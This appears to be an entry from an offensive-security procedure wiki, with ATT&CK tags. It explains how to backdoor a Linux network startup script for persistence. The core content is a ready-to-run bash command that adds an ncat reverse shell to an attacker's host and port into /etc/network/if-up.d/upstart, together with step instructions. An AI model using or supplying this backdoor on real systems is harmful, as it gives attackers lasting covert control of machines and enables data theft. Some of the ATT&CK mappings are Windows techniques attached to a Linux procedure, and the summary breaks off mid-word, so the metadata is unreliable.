---
id: 95d09087-0b89-4a12-8ad1-379bc3fad0b0
name: Linux - Startup Service Backdoor with Reverse Shell
type: procedure
verified: false
submitted: false
created_at: '2023-04-06T03:56:18.018800+00:00'
updated_at: '2023-04-10T20:34:19.934579+00:00'
tactics:
- '[[Defense Evasion|TA0005 - Defense Evasion]]'
- '[[Persistence|TA0003 - Persistence]]'
- '[[Privilege Escalation|TA0004 - Privilege Escalation]]'
techniques:
- '[[Boot or Logon Autostart Execution|T1547 - Boot or Logon Autostart Execution]]'
- '[[Create or Modify System Process|T1543 - Create or Modify System Process]]'
- '[[Hide Artifacts|T1564 - Hide Artifacts]]'
sub_techniques:
- '[[Hidden Files and Directories|T1564.001 - Hidden Files and Directories]]'
- '[[Registry Run Keys / Startup Folder|T1547.001 - Registry Run Keys / Startup Folder]]'
- '[[Windows Service|T1543.003 - Windows Service]]'
tags:
- '[[Backdooring a startup service]]'
- '[[Linux - Persistence]]'
commands:
- '[[Add reverse shell command to if-up.d upstart]]'
---

# Linux - Startup Service Backdoor with Reverse Shell

## Summary

This procedure involves backdooring a startup service on a Linux system with a reverse shell. The attacker modifies a system process to execute a reverse shell on startup, allowing them to establish persistent access to the system. This technique can be used for a variety of offensive purposes, inc

## Description

# Description

This procedure involves backdooring a startup service on a Linux system with a reverse shell. The attacker modifies a system process to execute a reverse shell on startup, allowing them to establish persistent access to the system. This technique can be used for a variety of offensive purposes, including data exfiltration, lateral movement, and further compromise of the target environment.

To execute this procedure, the attacker must first gain initial access to the target system and have sufficient privileges to modify system processes. They then modify a startup service configuration file to execute a reverse shell on startup. Once the system is restarted, the attacker can connect to the reverse shell and establish persistent access to the system.

From a business perspective, this technique can be used by attackers to maintain a foothold in a target environment, allowing them to continue to steal data, disrupt operations, or further compromise the organization.

 

## Requirements

1. Initial access to the target system

1. Sufficient privileges to modify system processes

1. Access to the startup service configuration file

1. Ability to establish a reverse shell connection

 

## Defense

1. Monitor system processes for unauthorized modifications

1. Implement strict access controls to limit privileges for system processes

1. Regularly review startup service configuration files for unauthorized changes

 

## Objectives

1. Establish persistent access to the target system

1. Maintain a foothold in the target environment

1. Execute further offensive actions, such as data exfiltration or lateral movement

 

# Instructions

1. To set up a reverse shell, run the command and it will edit the `/etc/network/if-up.d/upstart` file. This file will then execute the reverse shell command whenever the network interface goes up.

 



**Code**: [[RSHELL="ncat $LMTHD $LHOST $LPORT -e \"/bin/bash -]]



> The command sets up a reverse shell by creating a `RSHELL` variable that contains a `ncat` command. The `ncat` command is used to establish a connection to the attacker's machine at the specified `LHOST` and `LPORT`. The `-e` option is used to execute a command on the remote machine once the connection is established. In this case, the command `/bin/bash -c id;/bin/bash` is executed, which will run the `id` command to display the user ID and group information, followed by an interactive `bash` shell. The `2>/dev/null` option is used to redirect any error messages to `/dev/null`. The `sed` command is then used to insert the `RSHELL` variable into the `/etc/network/if-up.d/upstart` file at line 4. This ensures that the reverse shell command is executed whenever the network interface goes up.



**Command** ([[Add reverse shell command to if-up.d upstart]]):

```bash
RSHELL="ncat $LMTHD $LHOST $LPORT -e \"/bin/bash -c id;/bin/bash\" 2>/dev/null"
sed -i -e "4i \$RSHELL" /etc/network/if-up.d/upstart
```



## MITRE ATT&CK Mapping

### Tactics

- [[Defense Evasion|TA0005 - Defense Evasion]]
- [[Persistence|TA0003 - Persistence]]
- [[Privilege Escalation|TA0004 - Privilege Escalation]]

### Techniques

- [[Boot or Logon Autostart Execution|T1547 - Boot or Logon Autostart Execution]]
- [[Create or Modify System Process|T1543 - Create or Modify System Process]]
- [[Hide Artifacts|T1564 - Hide Artifacts]]

### Sub-Techniques

- [[Hidden Files and Directories|T1564.001 - Hidden Files and Directories]]
- [[Registry Run Keys / Startup Folder|T1547.001 - Registry Run Keys / Startup Folder]]
- [[Windows Service|T1543.003 - Windows Service]]

## Commands Used

- [[Add reverse shell command to if-up.d upstart]]

## Tags

- [[Backdooring a startup service]]
- [[Linux - Persistence]]


